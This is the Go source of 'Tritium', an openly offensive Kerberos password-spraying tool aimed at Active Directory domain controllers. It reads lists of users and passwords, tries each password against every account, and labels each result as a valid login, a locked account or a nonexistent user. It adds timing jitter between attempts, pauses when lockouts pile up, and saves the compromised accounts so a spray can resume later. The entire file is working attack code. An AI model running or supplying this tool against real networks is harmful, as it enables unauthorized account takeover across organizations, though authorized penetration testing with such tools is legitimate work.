/*

  Copyright (C) 2020 Ali Ahmad

  This program is free software; you can redistribute it and/or
  modify it under the terms of the GNU General Public License
  as published by the Free Software Foundation; version 2
  of the License only.

  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program; if not, write to
  Free Software Foundation, 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.

  Contact Information:

  Ali S. Ahmad (s4r1n97@gmail.com)

*/

package main

import (
	"bufio"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"os"
	"strings"
	"time"

	kclient "github.com/ropnop/gokrb5/client"
	kconfig "github.com/ropnop/gokrb5/config"
)

const (
	banner = `
	___________      .__  __  .__               
	\__    ___/______|__|/  |_|__|__ __  _____  
	  |    |  \_  __ \  \   __\  |  |  \/     \ 
	  |    |   |  | \/  ||  | |  |  |  /  Y Y  \
	  |____|   |__|  |__||__| |__|____/|__|_|__/ v 0.4
											  

	  Author: S4R1N, alfarom256
 `
	usage = `

 Required Params:

 -d            The full domain to use (-domain targetdomain.local)
 -dc           Domain controller to authenticate against (-dc washingtondc.targetdomain.local)
 -dcf          File of domain controllers to authenticate against 
 -u            Select single user to authenticate as (-user jsmith) 
 -uf           User file to use for password spraying (-userfile ~/home/users.txt)
 -p            Password to use for spraying (-password Welcome1)

 Optional: 

 -help         Print this help menu
 -o            Tritium Output file (default spray.json)
 -w            Wait time between authentication attempts [Default 1] (-w 0)    
 -jitter       % Jitter between authentication attempts      
 -rs           Enable recursive spraying 
 -ws           Wait time between sprays [Default 3600] (-ws 1800)
 -pwf          Password file to use for recursive 
 -res          Continue a password spraying campaign
 -rf           Tritium Json file 
 `

	KERB_FMT_STRING = `[libdefaults]
default_realm = ${REALM}
dns_lookup_realm = false
dns_lookup_kdc = true
[realms]
%s = {
	kdc = %s
}`
)

type FlagOptions struct { // option var decleration
	help             bool
	username         string
	userfile         string
	domain           string
	password         string
	domainController string
	dcf              string
	wait             int
	jitter           int
	o                string

	rs  bool
	ws  int
	pwf string

	res bool
	rf  string
}
type Authenticator interface {
	Login() (string, string, error)
}
type account struct {
	Username    string
	Domain      string
	Password    string
	Compromised bool
	PassNum     int
}

func options() *FlagOptions {
	username := flag.String("u", "", "single username to authenticate as")
	userfile := flag.String("uf", "", "userfile for spraying")
	domain := flag.String("d", "", "userdomain")
	password := flag.String("p", "", "password for spraying")
	domainController := flag.String("dc", "", "KDC to authenticate against")
	dcf := flag.String("dcf", "", "File of KDCs to Auth Against")

	help := flag.Bool("h", false, "Help Menu")
	wait := flag.Int("w", 1, "Wait time between authentication attempts")
	jitter := flag.Int("jitter", 0, "Jitter between auth attempts")
	rs := flag.Bool("rs", false, "Recursive Spray flag")
	ws := flag.Int("ws", 3600, "Wait time between sprays")
	pwf := flag.String("pwf", "", "Password file")
	res := flag.Bool("res", false, "Resumes a spray")
	rf := flag.String("rf", "", "Resume file")
	o := flag.String("o", "spray.json", "outfile")

	flag.Parse()

	return &FlagOptions{
		help:             *help,
		username:         *username,
		userfile:         *userfile,
		domain:           *domain,
		password:         *password,
		domainController: *domainController,
		wait:             *wait,
		rs:               *rs,
		ws:               *ws,
		pwf:              *pwf,
		rf:               *rf,
		res:              *res,
		o:                *o,
		jitter:           *jitter,
		dcf:              *dcf,
	}
}
func wait(wt int, jitPerc int) {

	var jitter float64 = 0
	var wait int = 0
	var sign int = rand.Intn(2)

	if sign == 0 {

		sign = 1

	} else {

		sign = -1

	}

	if jitPerc > 0 {

		jitter = float64(rand.Intn(jitPerc)*sign) / 100 // creates jitter percentage

	} else {

		jitter = 0.0

	}

	var jitWait float64 = float64(wt*1000) * jitter // creates jitter time (plus or minus whatever seconds)
	wait = (wt * 1000) + int(jitWait)               // actual wait time

	time.Sleep(time.Duration(wait) * time.Millisecond)
}

func randomDC(dcs []string) string {
	var dc string
	if len(dcs) > 0 {
		dc = dcs[rand.Intn(len(dcs))]
	}
	return dc
}

func saveState(users []account, of string) {

	file, _ := json.MarshalIndent(users, "", " ")

	_ = ioutil.WriteFile(of, file, 0644)
}
func removeUser(users []account, i int) []account {

	var user account

	copy(users[i:], users[i+1:]) // Shift a[i+1:] left one index.
	users[len(users)-1] = user   // Erase last element (write zero value).
	users = users[:len(users)-1] // Truncate slice.

	return users

}

func acctArrGen(ufile string, realm string, resumeSpray bool) []account {
	var acctArr []account
	var counter int = 0

	if resumeSpray != true {

		users := make([]account, linecounter(ufile)) // create array
		fmt.Println("Userfile set to: ", ufile)

		file, err := os.Open(ufile)

		if err != nil {
			log.Fatal(err)
		}

		defer file.Close()

		scanner := bufio.NewScanner(file)

		for scanner.Scan() {

			users[counter].Username = scanner.Text()
			users[counter].Domain = realm
			users[counter].Compromised = false
			users[counter].PassNum = 0
			counter++

		}

		acctArr = users

	} else {

		jsonFile, err := os.Open(ufile)
		if err != nil {
			fmt.Println(err)
		}
		defer jsonFile.Close()
		byteValue, _ := ioutil.ReadAll(jsonFile)
		json.Unmarshal(byteValue, &acctArr)

	}

	return acctArr
}

func kerbAuth(username string, relm string, pass string, domainController string) string {

	var domain = relm
	var user = username
	var password = pass
	var DC = domainController

	var retString string = "[" + DC + "]\t" + domain + "/" + username + ":" + password

	/*
		Formats the config per the RFC standard
	*/
	kcfg_str := fmt.Sprintf(KERB_FMT_STRING, domain, DC)

	cfg, err := kconfig.NewConfigFromString(kcfg_str)

	cl := kclient.NewClientWithPassword(user, domain, password, cfg, kclient.DisablePAFXFAST(true))
	err = cl.Login()

	if err != nil {
		if strings.Contains(err.Error(), "Networking_Error: AS Exchange Error") {
			fmt.Println("[Fatal: Networking Error - Cannot contact KDC]")
			os.Exit(1)
		} else if strings.Contains(err.Error(), "KRB_AP_ERR_SKEW") {
			fmt.Println("[FATAL: Time delta between server and client too large]")
			os.Exit(1)

		} else if strings.Contains(err.Error(), "KRB5_REALM_UNKNOWN") {

			fmt.Println("Cannot find KDC for requested realm")
			os.Exit(1)

		} else if strings.Contains(err.Error(), "KRB5_KDC_UNREACH") {

			fmt.Println("Cannot contact any KDC for requested realm")
			os.Exit(1)

		} else if strings.Contains(err.Error(), "client does not have a username") {

			retString += "\t [Blank Username]"

		} else if strings.Contains(err.Error(), "KDC_ERR_CLIENT_REVOKED") {

			retString += "\t [USER ACCOUNT LOCKED]"
			fmt.Println(retString)

		} else if strings.Contains(err.Error(), "KDC_ERR_PREAUTH_FAILED") {
			retString += "\t [Valid User But Invalid Password]"
			fmt.Println(retString)

		} else if strings.Contains(err.Error(), "KDC_ERR_C_PRINCIPAL_UNKNOWN") {

			retString += "\t [USER DOESN'T EXIST]"
			fmt.Println(retString)

		} else {

			retString += "\t [VALID Login!]"
			fmt.Println(retString)
		}

	}

	return retString
}

func linecounter(fileName string) int {
	var lines int
	f, _ := os.Open(fileName)
	scanner := bufio.NewScanner(f)

	for scanner.Scan() {
		lines++
	}
	return lines

}

func spray(users []account, password string, DCs []string, wt int, jitter int, of string, passNum int) {

	var lockoutProtection int = 0
	var matcher string = "" // case matcher

	for i := 0; i < len(users); i++ {

		if users[i].Compromised == false {

			if users[i].PassNum == 0 || users[i].PassNum < passNum {

				users[i].Password = password
				users[i].PassNum = passNum
				matcher = kerbAuth(users[i].Username, users[i].Domain, users[i].Password, randomDC(DCs))

				if strings.Contains(matcher, "[VALID Login!]") {

					users[i].Compromised = true

				}

				if strings.Contains(matcher, "[USER ACCOUNT LOCKED]") {

					lockoutProtection++

				} else if strings.Contains(matcher, "[USER DOESN'T EXIST]") {

					users = removeUser(users, i) // removes user in current element and moves everything else up
					i--                          // since element was removed and replaced this resets the counter so a user doesnt get skipped

				} else {

					lockoutProtection = 0

				}

				if lockoutProtection == 3 {

					fmt.Println("3 Consective Lockouts reached, exiting the program!")
					saveState(users, of)
					os.Exit(1) // exit program if 3 consecutive users are locked out

				}

				wait(wt, jitter)

			}

		}

	}

	saveState(users, of)

}

func recSpray(users []account, passfile string, DCs []string, wt int, jitter int, ws int, of string) {

	pwfile, err := os.Open(passfile) // openspasswordfile
	var counter int = 0              // used for tracking (mostly here for resume spray)
	fmt.Println("Password file set to:", passfile)

	if err != nil {

		log.Fatal(err)

	}

	defer pwfile.Close()
	pwscanner := bufio.NewScanner(pwfile)

	for pwscanner.Scan() {
		fmt.Println("----------------------", pwscanner.Text(), "----------------------")
		spray(users, pwscanner.Text(), DCs, wt, jitter, of, counter)
		counter++
		wait(ws, 0)

	}

}

func resSpray(rs bool, users []account, pwstring string, DCs []string, wt int, jitter int, ws int, of string) {

	if rs {

		recSpray(users, pwstring, DCs, wt, jitter, ws, of)

	} else {

		for i := 0; i < len(users); i++ { //resets for individual sprays
			users[i].PassNum = 0
		}

		spray(users, pwstring, DCs, wt, jitter, of, 0)

	}

}

func main() {

	var err bool = false
	var rs bool = false
	var dcARR []string

	rand.Seed(time.Now().UnixNano())

	fmt.Println(banner)
	opt := options()

	if opt.help {

		fmt.Println(usage)
		os.Exit(0)

	}

	if opt.domainController == "" && opt.dcf == "" {

		fmt.Println("Error I need a KDC or a KDC file")
		os.Exit(1)

	} else if opt.dcf != "" {

		dcList, err := os.Open(opt.dcf)

		if err != nil {

			log.Fatal(err)

		}

		defer dcList.Close()
		dcs := bufio.NewScanner(dcList)

		for dcs.Scan() {

			dcARR = append(dcARR, dcs.Text())

		}

	} else {

		dcARR = append(dcARR, opt.domainController)

	}

	if opt.res {

		if opt.rf != "" {

			userArr := acctArrGen(opt.rf, opt.domain, opt.res)

			if opt.rs {

				resSpray(opt.rs, userArr, opt.pwf, dcARR, opt.wait, opt.jitter, opt.ws, opt.o)
				os.Exit(0)

			} else {

				resSpray(opt.rs, userArr, opt.password, dcARR, opt.wait, opt.jitter, opt.ws, opt.o)
				os.Exit(0)

			}

		} else {

			fmt.Println("[+] Error spray database not provided")
			os.Exit(1)

		}

	} else {

		if opt.rs {
			rs = true
		}
		if opt.username == "" && opt.userfile == "" {
			fmt.Println("[+] Username or Userfile Not Provided")
			err = true
		}
		if opt.domain == "" {
			fmt.Println("[+] Domain Name Not Provided")
			err = true
		}
		if opt.password == "" && opt.rs == false {
			fmt.Println("[+] Password Not Provided")
			err = true
		}
		if err {
			fmt.Println("\nPlease reference help menu below to fix issues: ")
			fmt.Println(usage)
			os.Exit(1)
		}

		if opt.username != "" { // single user mode

			fmt.Println("Username set to: ", opt.username)
			kerbAuth(opt.username, opt.domain, opt.password, opt.domainController)
			os.Exit(0)

		} else if opt.userfile != "" { // password spray mode

			userArr := acctArrGen(opt.userfile, opt.domain, opt.res)

			if rs == false {

				if opt.password == "" {

					fmt.Println("ERROR: Single password spray without password flag")
					os.Exit(1)

				}

				spray(userArr, opt.password, dcARR, opt.wait, opt.jitter, opt.o, 0)

			} else {
				if opt.pwf != "" {

					recSpray(userArr, opt.pwf, dcARR, opt.wait, opt.jitter, opt.ws, opt.o)

				} else {

					fmt.Println("Error! Recursive spray selected but no password has been set!")
					os.Exit(1)

				}

			}

			os.Exit(0)
		}
	}

}
